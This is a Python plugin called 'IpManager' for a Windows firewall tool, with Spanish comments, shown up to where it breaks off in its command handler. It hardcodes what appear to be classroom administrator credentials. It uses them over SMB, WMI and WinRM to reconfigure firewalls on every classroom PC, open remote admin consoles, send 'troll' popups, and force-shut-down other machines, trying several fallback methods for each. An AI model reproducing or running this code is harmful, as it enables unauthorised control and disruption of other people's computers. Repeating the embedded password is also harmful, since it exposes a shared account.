"""
╔══════════════════════════════════════════════════════════════════╗
║                    IpManager — FyreWall Add-on                   ║
║          Gestión avanzada de direcciones IP e integraciones      ║
╚══════════════════════════════════════════════════════════════════╝

  Paquete FyreWall compatible con el sistema de plugins FyreManager.
  Coloca este archivo en el mismo directorio que fyrewall.py y
  usa 'fyre-manager → import' o arrástralo a la carpeta para cargarlo.

  Al ejecutar con 'run ipmanager' o doble-click en FyreManager:
    → Primera vez: instalador interactivo en nueva consola
    → Ya instalado:  menú de gestión / desinstalación segura
"""

# ─── MANIFEST ────────────────────────────────────────────────────────────────

FYRE_MANIFEST = {
    "name":        "IpManager",
    "version":     "1.0.0",
    "author":      "FyreWall Add-on",
    "description": "Gestión avanzada de IPs: escaneo, bloqueos, trolling y más.",
    "commands": [
        {
            "name":        "ip",
            "description": "ip <subcomando> — gestor de IPs (escribe 'ip help')",
            "kind":        "inline",
            "handler":     "handle_ip_command",
        },
    ],
}

# ─── IMPORTS ─────────────────────────────────────────────────────────────────

import os
import sys
import time
import json
import socket
import struct
import threading
import subprocess
import ctypes
import re

# ─── CONSTANTS ───────────────────────────────────────────────────────────────

_RULE_PREFIX  = "FyreWall_IpMgr_"
_STATE_FILE   = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".ipmanager_state.json")
_CF           = getattr(subprocess, "CREATE_NO_WINDOW", 0)
_CF_CONSOLE   = getattr(subprocess, "CREATE_NEW_CONSOLE", 0)

# ─── CREDENCIALES DE AULA ────────────────────────────────────────────────────
_AULA_USER = "AulaPalcam"
_AULA_PASS = "Palcam1956"

# Referencia a la instancia de FyreWallApp (inyectada por FyreWall al cargar el plugin)
_FYREWALL_APP = None

def _set_app(app):
    """FyreWall llama a esto al cargar el plugin para inyectar la referencia a la app."""
    global _FYREWALL_APP
    _FYREWALL_APP = app

# ─── STATE HELPERS ───────────────────────────────────────────────────────────

def _read_state() -> dict:
    try:
        with open(_STATE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def _write_state(data: dict):
    try:
        with open(_STATE_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass

def _is_installed() -> bool:
    return _read_state().get("installed", False)

def _mark_installed(first_time: bool = True):
    state = _read_state()
    state["installed"]   = True
    state["first_run"]   = first_time
    state["install_ts"]  = time.strftime("%Y-%m-%d %H:%M:%S")
    _write_state(state)

def _mark_uninstalled():
    state = _read_state()
    state["installed"]  = False
    state["first_run"]  = False
    _write_state(state)

def _was_first_run() -> bool:
    state = _read_state()
    if state.get("first_run", False):
        state["first_run"] = False
        _write_state(state)
        return True
    return False

# ─── NETSH / FIREWALL HELPERS ────────────────────────────────────────────────

def _run_netsh(*args) -> tuple[bool, str]:
    try:
        r = subprocess.run(
            ["netsh", "advfirewall", "firewall"] + list(args),
            capture_output=True, text=True, timeout=15, creationflags=_CF
        )
        ok = r.returncode == 0
        return ok, (r.stdout + r.stderr).strip()
    except Exception as e:
        return False, str(e)

def _rule_exists(name: str) -> bool:
    try:
        r = subprocess.run(
            ["netsh", "advfirewall", "firewall", "show", "rule", f"name={name}"],
            capture_output=True, text=True, timeout=10, creationflags=_CF
        )
        return "No rules match" not in r.stdout and r.returncode == 0
    except Exception:
        return False

def _block_ip(ip: str) -> tuple[bool, str]:
    rule_in  = f"{_RULE_PREFIX}Block_IN_{ip.replace('.', '_').replace(':', '_')}"
    rule_out = f"{_RULE_PREFIX}Block_OUT_{ip.replace('.', '_').replace(':', '_')}"
    results  = []
    for name, direction in [(rule_in, "in"), (rule_out, "out")]:
        if _rule_exists(name):
            results.append(f"  ⚠️  Regla '{direction}' ya existía.")
            continue
        ok, msg = _run_netsh(
            "add", "rule", f"name={name}",
            "dir=" + direction, "action=block",
            f"remoteip={ip}", "enable=yes",
            "profile=any", "interfacetype=any"
        )
        if ok:
            results.append(f"  ✅  Bloqueada dirección {ip} ({direction.upper()})")
        else:
            results.append(f"  ❌  Error bloqueando {ip} ({direction.upper()}): {msg}")
    return True, "\n".join(results)

def _unblock_ip(ip: str) -> tuple[bool, str]:
    rule_in  = f"{_RULE_PREFIX}Block_IN_{ip.replace('.', '_').replace(':', '_')}"
    rule_out = f"{_RULE_PREFIX}Block_OUT_{ip.replace('.', '_').replace(':', '_')}"
    results  = []
    for name, direction in [(rule_in, "in"), (rule_out, "out")]:
        if not _rule_exists(name):
            results.append(f"  ⚠️  No hay regla '{direction}' para {ip}.")
            continue
        ok, msg = _run_netsh("delete", "rule", f"name={name}")
        if ok:
            results.append(f"  ✅  Desbloqueada {ip} ({direction.upper()})")
        else:
            results.append(f"  ❌  Error desbloqueando {ip} ({direction.upper()}): {msg}")
    return True, "\n".join(results)

# ─── NETWORK UTILITIES ───────────────────────────────────────────────────────

def _get_local_ips() -> list[str]:
    """Obtiene IPs locales del sistema."""
    ips = []
    try:
        out = subprocess.check_output(
            ["ipconfig"], text=True, timeout=10,
            creationflags=_CF, encoding="cp850", errors="replace"
        )
        for line in out.splitlines():
            m = re.search(r"IPv4.*?:\s*([\d]{1,3}(?:\.[\d]{1,3}){3})", line)
            if m:
                ip = m.group(1)
                if not ip.startswith("127."):
                    ips.append(ip)
    except Exception:
        pass
    return ips

def _get_network_prefix(ip: str) -> str:
    """Devuelve el prefijo de red (ej. 192.168.1.)."""
    parts = ip.rsplit(".", 1)
    return parts[0] + "." if len(parts) == 2 else ip

def _scan_active_ips() -> list[dict]:
    """Escanea IPs con conexiones activas via netstat."""
    results = []
    seen    = set()
    try:
        out = subprocess.check_output(
            ["netstat", "-ano"], text=True, timeout=15, creationflags=_CF
        )
        pid_to_name = {}
        try:
            tl = subprocess.check_output(
                ["tasklist", "/fo", "csv", "/nh"],
                text=True, timeout=10, creationflags=_CF
            )
            for line in tl.splitlines():
                parts = [p.strip('"') for p in line.split('","')]
                if len(parts) >= 2:
                    try:
                        pid_to_name[int(parts[1])] = parts[0]
                    except ValueError:
                        pass
        except Exception:
            pass

        for line in out.splitlines():
            m = re.match(
                r"(TCP|UDP)\s+([\d\.]+):\d+\s+([\d\.]+):(\d+|\*)\s+(\w[\w\s]*)?\s*(\d+)$",
                line.strip()
            )
            if not m:
                continue
            remote = m.group(3)
            rport  = m.group(4)
            pid    = int(m.group(6))
            if remote in ("0.0.0.0", "127.0.0.1", "*", "[::]") or rport == "*":
                continue
            key = remote
            if key in seen:
                continue
            seen.add(key)
            results.append({
                "ip":      remote,
                "port":    rport,
                "proto":   m.group(1),
                "process": pid_to_name.get(pid, f"PID {pid}"),
            })
    except Exception:
        pass
    return results

def _scan_local_network() -> list[str]:
    """
    Descubre hosts activos en la red local.
    Ping sweep en lotes de 20 hilos para no saturar el switch,
    con 80ms de timeout por ping — rápido pero sin floodear.
    """
    my_ips = _get_local_ips()
    prefixes = list({ip.rsplit(".", 1)[0] + "." for ip in my_ips})
    if not prefixes:
        prefixes = ["192.168.1."]

    alive = []

    def _ping(ip):
        try:
            r = subprocess.run(
                ["ping", "-n", "1", "-w", "80", ip],
                capture_output=True, timeout=1, creationflags=_CF
            )
            if r.returncode == 0:
                alive.append(ip)
        except Exception:
            pass

    for prefix in prefixes:
        ips = [f"{prefix}{i}" for i in range(1, 255)]
        # Lotes de 20 hilos — rápido pero sin masacrar el switch
        batch_size = 20
        for i in range(0, len(ips), batch_size):
            batch = ips[i:i+batch_size]
            threads = [threading.Thread(target=_ping, args=(ip,), daemon=True) for ip in batch]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=1.5)
            time.sleep(0.05)  # 50ms entre lotes

    # Complementar con arp -a (coge los que no respondieron al ping pero están en caché)
    seen = set(alive)
    try:
        out = subprocess.check_output(
            ["arp", "-a"], text=True, timeout=10,
            creationflags=_CF, encoding="cp850", errors="replace"
        )
        for line in out.splitlines():
            m = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)
            if m:
                ip = m.group(1)
                if (not ip.startswith("127.")
                        and not ip.endswith(".255")
                        and not ip.endswith(".0")
                        and ip not in seen):
                    seen.add(ip)
                    alive.append(ip)
    except Exception:
        pass

    def _sort_key(ip):
        try:
            return tuple(int(x) for x in ip.split("."))
        except Exception:
            return (0,0,0,0)

    alive.sort(key=_sort_key)
    return alive

def _scan_vulnerable_ports() -> list[dict]:
    """Escanea puertos vulnerables en localhost."""
    VULN_PORTS = {
        21:    ("FTP",           "Transferencia archivos en claro"),
        22:    ("SSH",           "Acceso remoto — verifica si deberías tenerlo abierto"),
        23:    ("Telnet",        "⚠️  PELIGROSO: Protocolo sin cifrado"),
        25:    ("SMTP",          "Servidor de correo — puede ser usado para spam"),
        53:    ("DNS",           "Servidor DNS — verifica si es intencional"),
        80:    ("HTTP",          "Servidor web sin cifrado"),
        135:   ("RPC",           "Windows RPC — vector de exploits clásico"),
        139:   ("NetBIOS",       "Compartir archivos legacy — expuesto en red"),
        443:   ("HTTPS",         "Servidor web — normal si tienes servidor"),
        445:   ("SMB",           "⚠️  Compartir archivos Windows — WannaCry lo usó"),
        1433:  ("MSSQL",         "⚠️  Base de datos SQL Server expuesta"),
        3306:  ("MySQL",         "⚠️  Base de datos MySQL expuesta"),
        3389:  ("RDP",           "⚠️  Escritorio Remoto — frecuentemente atacado"),
        4444:  ("Metasploit",    "🔴  Puerto típico de shells reversas / exploits"),
        5900:  ("VNC",           "Control remoto — verifica si es intencional"),
        6379:  ("Redis",         "⚠️  Redis sin autenticación = acceso total"),
        8080:  ("HTTP-alt",      "Servidor web alternativo"),
        27017: ("MongoDB",       "⚠️  MongoDB — frecuentemente sin contraseña"),
    }
    found = []
    local_ip = "127.0.0.1"
    for port, (service, risk) in VULN_PORTS.items():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.4)
            result = s.connect_ex((local_ip, port))
            s.close()
            if result == 0:
                found.append({"port": port, "service": service, "risk": risk})
        except Exception:
            pass
    return found

def _mount_ipc(ip: str) -> tuple[bool, str]:
    """
    Monta IPC$ en el host remoto via SMB (puerto 445/139).
    Devuelve (ok, msg).
    """
    ps = (
        f"net use \\\\{ip}\\IPC$ '{_AULA_PASS}' /user:{_AULA_USER} 2>&1"
    )
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
            capture_output=True, text=True, timeout=10, creationflags=_CF
        )
        if r.returncode == 0 or "already" in (r.stdout + r.stderr).lower():
            return True, f"  ✅  IPC$ montado en {ip}"
        return False, f"  ❌  No se pudo montar IPC$ en {ip}: {(r.stdout + r.stderr).strip()[:120]}"
    except subprocess.TimeoutExpired:
        return False, f"  ❌  Timeout conectando a {ip}"
    except Exception as e:
        return False, f"  ❌  Error: {e}"


def _unmount_ipc(ip: str):
    """Desmonta IPC$ del host remoto."""
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command",
             f"net use \\\\{ip}\\IPC$ /delete /y 2>$null"],
            capture_output=True, timeout=8, creationflags=_CF
        )
    except Exception:
        pass


def _connect_admin_console(ip: str) -> tuple[bool, str]:
    """
    Abre una pestaña de terminal remota en FyreWall para el PC indicado.
    La pestaña se llama con la IP y permite ejecutar comandos via SMB + WMI.
    """
    if _FYREWALL_APP is not None:
        try:
            # Llamamos en el hilo principal de tkinter usando after()
            _FYREWALL_APP.after(0, lambda: _FYREWALL_APP.open_remote_tab(
                ip, _AULA_USER, _AULA_PASS
            ))
            return True, f"  ✅  Abriendo pestaña remota para {ip}..."
        except Exception as e:
            return False, f"  ❌  Error abriendo pestaña: {e}"
    else:
        return False, (
            "  ❌  No se encontró la app FyreWall.\n"
            "  Asegúrate de que ipmanager está cargado como plugin de FyreWall."
        )


def _enable_wmi_on_host(ip: str) -> tuple[bool, str]:
    """
    Habilita WMI en el firewall del host remoto.
    Va despacio para no saturar el switch.
    """
    errors = []
    # Construir comandos netsh sin f-strings con comillas anidadas
    grp1 = "Instrumental de administracion de Windows"
    grp2 = "Windows Management Instrumentation (WMI)"
    netsh1 = 'netsh advfirewall firewall set rule group="' + grp1 + '" new enable=yes'
    netsh2 = 'netsh advfirewall firewall set rule group="' + grp2 + '" new enable=yes'

    # Método 1: WMI con PSCredential
    ps1 = (
        "$pw = ConvertTo-SecureString '" + _AULA_PASS + "' -AsPlainText -Force; "
        "$cred = New-Object System.Management.Automation.PSCredential('" + _AULA_USER + "', $pw); "
        "$wc = Get-WmiObject -Class Win32_Process -ComputerName " + ip + " -Credential $cred -List -ErrorAction Stop; "
        "$wc.Create('" + netsh1 + "') | Out-Null; "
        "$wc.Create('" + netsh2 + "') | Out-Null"
    )
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps1],
            capture_output=True, text=True, timeout=5, creationflags=_CF
        )
        if r.returncode == 0:
            return True, "  \u2705  WMI habilitado en " + ip
        errors.append("WMI directo \u2192 " + (r.stderr or r.stdout).strip()[:120])
    except subprocess.TimeoutExpired:
        errors.append("WMI directo \u2192 Timeout")
    except Exception as e:
        errors.append("WMI directo \u2192 " + str(e))

    # Método 2: net use IPC$ + wmiclass sin PSCredential
    ps2 = (
        "net use \\\\" + ip + "\\IPC$ '" + _AULA_PASS + "' /user:" + _AULA_USER + " 2>$null; "
        "$wc = [wmiclass]'\\\\" + ip + "\\root\\cimv2:Win32_Process'; "
        "$wc.Create('" + netsh1 + "') | Out-Null; "
        "$wc.Create('" + netsh2 + "') | Out-Null; "
        "net use \\\\" + ip + "\\IPC$ /delete /y 2>$null"
    )
    try:
        r2 = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps2],
            capture_output=True, text=True, timeout=5, creationflags=_CF
        )
        if r2.returncode == 0:
            return True, "  \u2705  WMI habilitado en " + ip + " (net use)"
        errors.append("net use+WMI \u2192 " + (r2.stderr or r2.stdout).strip()[:120])
    except subprocess.TimeoutExpired:
        errors.append("net use+WMI \u2192 Timeout")
    except Exception as e:
        errors.append("net use+WMI \u2192 " + str(e))

    err_lines = "\n".join("    \u2022 " + e for e in errors)
    return False, "  \u274c  " + ip + " \u2192 no se pudo habilitar WMI:\n" + err_lines


def _send_troll_message(ip: str, message: str) -> tuple[bool, str]:
    """
    Envía un popup a un PC remoto.
    Primero establece conexión SMB (IPC$ via 445/139), luego ejecuta msg.exe.
    """
    errors = []
    escaped_msg = message.replace('"', "'").replace("'", "\'")

    # ── Paso 0: montar IPC$ via SMB (445/139) ────────────────────────────────
    ipc_ok, ipc_msg = _mount_ipc(ip)
    if ipc_ok:
        # Con IPC$ montado, msg.exe puede llegar directamente
        try:
            r0 = subprocess.run(
                ["msg", f"\\\\{ip}", "*", message],
                capture_output=True, text=True, timeout=15, creationflags=_CF
            )
            if r0.returncode == 0:
                _unmount_ipc(ip)
                return True, f"  ✅  Mensaje enviado a {ip} (SMB/msg.exe)"
            errors.append(f"SMB+msg.exe → {(r0.stderr or r0.stdout).strip()[:100]}")
        except Exception as e:
            errors.append(f"SMB+msg.exe → {e}")

        # Con IPC$ montado, intentar WMI sin credenciales adicionales
        ps_smb = (
            f"$wc = [wmiclass]'\\\\" + ip + "\\\\root\\\\cimv2:Win32_Process'; "
            f"$wc.Create('msg * {escaped_msg}') | Out-Null"
        )
        try:
            r_smb = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_smb],
                capture_output=True, text=True, timeout=15, creationflags=_CF
            )
            if r_smb.returncode == 0:
                _unmount_ipc(ip)
                return True, f"  ✅  Mensaje enviado a {ip} (SMB+WMI)"
            errors.append(f"SMB+WMI → {(r_smb.stderr or r_smb.stdout).strip()[:100]}")
        except Exception as e:
            errors.append(f"SMB+WMI → {e}")
        _unmount_ipc(ip)
    else:
        errors.append(f"SMB IPC$ → {ipc_msg.strip()}")

    # ── Método 1: WMI Win32_Process → msg * (PowerShell nativo) ─────────────
    ps1 = (
        f"$pw = ConvertTo-SecureString '{_AULA_PASS}' -AsPlainText -Force; "
        f"$cred = New-Object System.Management.Automation.PSCredential('{_AULA_USER}', $pw); "
        f"$wmi = Get-WmiObject -Class Win32_Process -ComputerName {ip} -Credential $cred -List; "
        f"$r = $wmi.Create('msg * {escaped_msg}'); "
        f"exit $r.ReturnValue"
    )
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps1],
            capture_output=True, text=True, timeout=20, creationflags=_CF
        )
        if r.returncode == 0:
            return True, f"  ✅  Mensaje enviado a {ip}"
        errors.append(f"WMI/msg → código {r.returncode}: {(r.stderr or r.stdout).strip()[:100]}")
    except subprocess.TimeoutExpired:
        errors.append("WMI/msg → Timeout")
    except Exception as e:
        errors.append(f"WMI/msg → {e}")

    # ── Método 2: Invoke-WmiMethod (sintaxis alternativa) ────────────────────
    ps2 = (
        f"$pw = ConvertTo-SecureString '{_AULA_PASS}' -AsPlainText -Force; "
        f"$cred = New-Object System.Management.Automation.PSCredential('{_AULA_USER}', $pw); "
        f"Invoke-WmiMethod -ComputerName {ip} -Credential $cred "
        f"-Class Win32_Process -Name Create -ArgumentList 'msg * {escaped_msg}'"
    )
    try:
        r2 = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps2],
            capture_output=True, text=True, timeout=20, creationflags=_CF
        )
        out2 = (r2.stdout or "").strip()
        if r2.returncode == 0 and ("ReturnValue" not in out2 or "ReturnValue  : 0" in out2 or "ReturnValue : 0" in out2):
            return True, f"  ✅  Mensaje enviado a {ip} (Invoke-WmiMethod)"
        errors.append(f"Invoke-WmiMethod → {(r2.stderr or out2)[:100]}")
    except subprocess.TimeoutExpired:
        errors.append("Invoke-WmiMethod → Timeout")
    except Exception as e:
        errors.append(f"Invoke-WmiMethod → {e}")

    # ── Método 3: Invoke-Command / WinRM ─────────────────────────────────────
    ps3 = (
        f"$pw = ConvertTo-SecureString '{_AULA_PASS}' -AsPlainText -Force; "
        f"$cred = New-Object System.Management.Automation.PSCredential('{_AULA_USER}', $pw); "
        f"Invoke-Command -ComputerName {ip} -Credential $cred "
        f"-ScriptBlock {{ msg * '{escaped_msg}' }}"
    )
    try:
        r3 = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps3],
            capture_output=True, text=True, timeout=20, creationflags=_CF
        )
        if r3.returncode == 0:
            return True, f"  ✅  Mensaje enviado a {ip} (WinRM)"
        errors.append(f"WinRM → {(r3.stderr or r3.stdout).strip()[:100]}")
    except subprocess.TimeoutExpired:
        errors.append("WinRM → Timeout")
    except Exception as e:
        errors.append(f"WinRM → {e}")

    err_lines = "\n".join(f"       • {e}" for e in errors)
    return False, (
        f"  ⚠️  No se pudo enviar mensaje a {ip}.\n\n"
        f"  Errores intentados:\n{err_lines}\n\n"
        f"  ℹ️  El host remoto necesita tener WMI accesible en el firewall.\n"
        f"  Ejecuta en el PC remoto (admin): netsh advfirewall firewall set rule "
        f'group="Instrumental de administración de Windows" new enable=yes'
    )


def _shutdown_device(ip: str) -> tuple[bool, str]:
    """
    Apaga un PC remoto.
    Primero establece conexión SMB (IPC$ via 445/139), luego ejecuta shutdown.
    """
    errors = []

    # ── Paso 0: montar IPC$ via SMB (445/139) ────────────────────────────────
    ipc_ok, ipc_msg = _mount_ipc(ip)
    if ipc_ok:
        # Con IPC$ montado, shutdown /m funciona directamente
        try:
            r0 = subprocess.run(
                ["shutdown", "/s", "/f", "/t", "0", "/m", f"\\\\{ip}"],
                capture_output=True, text=True, timeout=15, creationflags=_CF
            )
            _unmount_ipc(ip)
            if r0.returncode == 0:
                return True, f"  ✅  Apagado enviado a {ip} (SMB + shutdown.exe)"
            errors.append(f"SMB+shutdown.exe → {(r0.stderr or r0.stdout).strip()[:100]}")
        except Exception as e:
            errors.append(f"SMB+shutdown.exe → {e}")
            _unmount_ipc(ip)
    else:
        errors.append(f"SMB IPC$ → {ipc_msg.strip()}")
    ps1 = (
        f"$pw = ConvertTo-SecureString '{_AULA_PASS}' -AsPlainText -Force; "
        f"$cred = New-Object System.Management.Automation.PSCredential('{_AULA_USER}', $pw); "
        f"$os = Get-WmiObject -Class Win32_OperatingSystem -ComputerName {ip} -Credential $cred; "
        f"$r = $os.Win32Shutdown(5); exit $r.ReturnValue"
    )
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps1],
            capture_output=True, text=True, timeout=20, creationflags=_CF
        )
        if r.returncode == 0:
            return True, f"  ✅  Apagado enviado a {ip} (WMI Win32Shutdown)"
        errors.append(f"WMI Win32Shutdown → código {r.returncode}: {(r.stderr or r.stdout).strip()[:100]}")
    except subprocess.TimeoutExpired:
        errors.append("WMI Win32Shutdown → Timeout")
    except Exception as e:
        errors.append(f"WMI Win32Shutdown → {e}")

    # ── Método 2: Invoke-Command / WinRM → Stop-Computer ────────────────────
    ps2 = (
        f"$pw = ConvertTo-SecureString '{_AULA_PASS}' -AsPlainText -Force; "
        f"$cred = New-Object System.Management.Automation.PSCredential('{_AULA_USER}', $pw); "
        f"Invoke-Command -ComputerName {ip} -Credential $cred "
        f"-ScriptBlock {{ Stop-Computer -Force }}"
    )
    try:
        r2 = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps2],
            capture_output=True, text=True, timeout=25, creationflags=_CF
        )
        if r2.returncode == 0:
            return True, f"  ✅  Apagado enviado a {ip} (WinRM Stop-Computer)"
        errors.append(f"WinRM Stop-Computer → {(r2.stderr or r2.stdout).strip()[:100]}")
    except subprocess.TimeoutExpired:
        errors.append("WinRM Stop-Computer → Timeout")
    except Exception as e:
        errors.append(f"WinRM Stop-Computer → {e}")

    # ── Método 3: shutdown.exe /m con credenciales vía runas ─────────────────
    # Montar IPC$ para autenticarse y luego lanzar shutdown
    ps3 = (
        f"net use \\\\{ip}\\IPC$ '{_AULA_PASS}' /user:{_AULA_USER} 2>$null; "
        f"shutdown /s /f /t 0 /m \\\\{ip}; "
        f"net use \\\\{ip}\\IPC$ /delete /y 2>$null"
    )
    try:
        r3 = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps3],
            capture_output=True, text=True, timeout=20, creationflags=_CF
        )
        if r3.returncode == 0:
            return True, f"  ✅  Apagado enviado a {ip} (net use + shutdown)"
        errors.append(f"net use+shutdown → {(r3.stderr or r3.stdout).strip()[:100]}")
    except subprocess.TimeoutExpired:
        errors.append("net use+shutdown → Timeout")
    except Exception as e:
        errors.append(f"net use+shutdown → {e}")

    err_lines = "\n".join(f"       • {e}" for e in errors)
    return False, (
        f"  ❌  No se pudo apagar {ip}.\n\n"
        f"  Errores intentados:\n{err_lines}\n\n"
        f"  ℹ️  El host remoto necesita tener WMI accesible en el firewall.\n"
        f"  Ejecuta en el PC remoto (admin): netsh advfirewall firewall set rule "
        f'group="Instrumental de administración de Windows" new enable=yes'
    )


# ─── IP COMMAND HELP ─────────────────────────────────────────────────────────

_IP_HELP = """\
╔══════════════════════════════════════════════════════════════╗
║               IpManager — Comandos disponibles               ║
╚══════════════════════════════════════════════════════════════╝

  ESCANEO
  ─────────────────────────────────────────────────────────────
  ip scan-ip
      Escanea todas las IPs con conexiones activas al equipo
      (entrantes y salientes) y muestra proceso asociado.

  ip scan-local
      Muestra todos los dispositivos detectados en la red
      local actual mediante ARP.

  ip scan-vulnerableports
      Escanea puertos abiertos en tu equipo que puedan
      representar vulnerabilidades de seguridad.

  BLOQUEOS
  ─────────────────────────────────────────────────────────────
  ip block <ip>
      Bloquea una dirección IP (tráfico entrante y saliente).
      Ej: ip block 192.168.1.100

  ip unblock <ip>
      Elimina el bloqueo de una dirección IP.
      Ej: ip unblock 192.168.1.100

  ip blockall [-ip1 -ip2 ...]
      Bloquea TODAS las IPs locales activas. Puedes excluir
      IPs concretas con el prefijo '-'.
      Ej: ip blockall
          ip blockall -192.168.1.1 -10.0.0.1

  ACCIONES DE RED LOCAL
  ─────────────────────────────────────────────────────────────
  ip admin-pc <ip>
      Abre una consola remota interactiva en el PC indicado.
      Usa SMB (445/139) para autenticarse y luego PSSession.
      Ej: ip admin-pc 192.168.1.50

  ip troll <ip> <mensaje>
      Envía un mensaje de alerta emergente (popup) a un
      dispositivo de la red local. Usa SMB (445/139) primero.
      Ej: ip troll 192.168.1.50 Hola desde FyreWall!

  ip shutdown <ip>
      Envía señal de apagado a un dispositivo de la red
      local. Usa SMB (445/139) + shutdown.exe directamente.
      Ej: ip shutdown 192.168.1.50

  SETUP
  ─────────────────────────────────────────────────────────────
  ip setup-aula
      Habilita WMI en todos los PCs del aula de una vez.
      Solo necesario la primera vez.

  ip setup-pc <ip>
      Habilita WMI en un PC concreto.
      Ej: ip setup-pc 192.168.11.15

  CREDENCIALES (para PsExec / WinRM en red de aula)
  ─────────────────────────────────────────────────────────────
  ip setcreds <usuario> <contraseña>
      Guarda credenciales admin para usar con shutdown y troll.
      Solo necesitas hacerlo una vez.
      Ej: ip setcreds Administrador MiClave123

  ip clearcreds
      Elimina las credenciales guardadas.

  GENERAL
  ─────────────────────────────────────────────────────────────
  ip help     Muestra esta ayuda.
──────────────────────────────────────────────────────────────\
"""

# ─── MAIN IP COMMAND HANDLER ─────────────────────────────────────────────────

def handle_ip_command(args: list[str]) -> tuple[str, str]:
    """
    Handler principal del comando 'ip'.
    Devuelve (output_text, level) donde level es: info | ok | warn | error
    """
    if not args:
        return _IP_HELP, "info"

    sub = args[0].lower()

    # ── ip help ──────────────────────────────────────────────────────────────
    if sub == "help":
        return _IP_HELP, "info"

    # ── ip scan-ip ───────────────────────────────────────────────────────────
    if sub == "scan-ip":
        conns = _scan_active_ips()
        if not conns:
            return "  ℹ️  No se detectaron conexiones IP activas en este momento.", "warn"
        lines = [
            "╔══════════════════════════════════════════════════════════════╗",
            "║              IpManager — IPs con conexión activa             ║",
            "╚══════════════════════════════════════════════════════════════╝",
            "",
        ]
        for i, c in enumerate(conns, 1):
            lines.append(f"  {i:>2}. 🌐  {c['ip']:<20}  Puerto: {c['port']:<6}  Proto: {c['proto']:<4}  [{c['process']}]")
        lines.append(f"\n  Total: {len(conns)} IP(s) detectada(s).")
        lines.append("  💡  Usa 'ip block <ip>' para bloquear cualquiera de estas.")
        return "\n".join(lines), "info"

    # ── ip scan-local ────────────────────────────────────────────────────────
    if sub == "scan-local":
        hosts = _scan_local_network()
        my_ips = _get_local_ips()
        if not hosts:
            return "  ℹ️  No se encontraron dispositivos en la red local (ARP vacío).", "warn"
        lines = [
            "╔══════════════════════════════════════════════════════════════╗",
            "║              IpManager — Red local (ARP scan)                ║",
            "╚══════════════════════════════════════════════════════════════╝",
            "",
        ]
        for i, ip in enumerate(hosts, 1):
            tag = "  (tú)" if ip in my_ips else ""
            lines.append(f"  {i:>2}. 📡  {ip}{tag}")
        lines.append(f"\n  Total: {len(hosts)} dispositivo(s) encontrado(s).")
        lines.append("  💡  Usa 'ip shutdown <ip>' para apagar un dispositivo remoto.")
        return "\n".join(lines), "info"

    # ── ip scan-vulnerableports ───────────────────────────────────────────────
    if sub == "scan-vulnerableports":
        found = _scan_vulnerable_ports()
        lines = [
            "╔══════════════════════════════════════════════════════════════╗",
            "║           IpManager — Análisis de puertos vulnerables        ║",
            "╚══════════════════════════════════════════════════════════════╝",
            "",
        ]
        if not found:
            lines.append("  ✅  No se detectaron puertos vulnerables abiertos. ¡Buen trabajo!")
        else:
            lines.append(f"  ⚠️  Se encontraron {len(found)} puerto(s) potencialmente vulnerables:\n")
            for p in found:
                lines.append(f"  🔓  Puerto {p['port']:<6} [{p['service']:<12}]  {p['risk']}")
            lines.append("\n  💡  Usa 'block-port <puerto>' de FyreWall para cerrar puertos.")
        return "\n".join(lines), "warn" if found else "ok"

    # ── ip block <ip> ────────────────────────────────────────────────────────
    if sub == "block":
        if len(args) < 2:
            return "  Uso: ip block <dirección_ip>\n  Ej:  ip block 192.168.1.100", "warn"
        ip = args[1]
        _, result = _block_ip(ip)
        return f"  🔒  IpManager — Bloqueo de IP\n\n{result}", "ok"

    # ── ip unblock <ip> ──────────────────────────────────────────────────────
    if sub == "unblock":
        if len(args) < 2:
            return "  Uso: ip unblock <dirección_ip>\n  Ej:  ip unblock 192.168.1.100", "warn"
        ip = args[1]
        _, result = _unblock_ip(ip)
        return f"  🔓  IpManager — Desbloqueo de IP\n\n{result}", "ok"

    # ── ip blockall [-ip1 -ip2 ...] ──────────────────────────────────────────
    if sub == "blockall":
        # Extraer exclusiones (args con prefijo -)
        excluded = set()
        for a in args[1:]:
            if a.startswith("-"):
                excluded.add(a[1:])

        # Obtener IPs: activas + locales
        all_ips = set(c["ip"] for c in _scan_active_ips())
        all_ips.update(_scan_local_network())
        all_ips.update(_get_local_ips())

        # Eliminar exclusiones y propias
        my_ips = set(_get_local_ips())
        targets = all_ips - excluded - my_ips

        if not targets:
            return "  ℹ️  No se encontraron IPs para bloquear.", "warn"

        lines = [
            "╔══════════════════════════════════════════════════════════════╗",
            "║                  IpManager — Bloqueo masivo                  ║",
            "╚══════════════════════════════════════════════════════════════╝",
            "",
        ]
        if excluded:
            lines.append(f"  🛡️  IPs excluidas: {', '.join(sorted(excluded))}\n")

        for ip in sorted(targets):
            _, result = _block_ip(ip)
            lines.append(result)

        lines.append(f"\n  ✅  Proceso completado. {len(targets)} IP(s) procesada(s).")
        return "\n".join(lines), "ok"

    # ── ip admin-pc <ip> ─────────────────────────────────────────────────────
    if sub == "admin-pc":
        if len(args) < 2:
            return (
                "  Uso: ip admin-pc <ip>\n"
                "  Ej:  ip admin-pc 192.168.1.50\n"
                "  Abre una consola remota interactiva en el PC indicado.", "warn"
            )
        ip = args[1]
        ok, result = _connect_admin_console(ip)
        return f"  🖥️   IpManager — Consola remota en {ip}\n\n{result}", "ok" if ok else "warn"

    # ── ip troll <ip> <mensaje> ───────────────────────────────────────────────
    if sub == "troll":
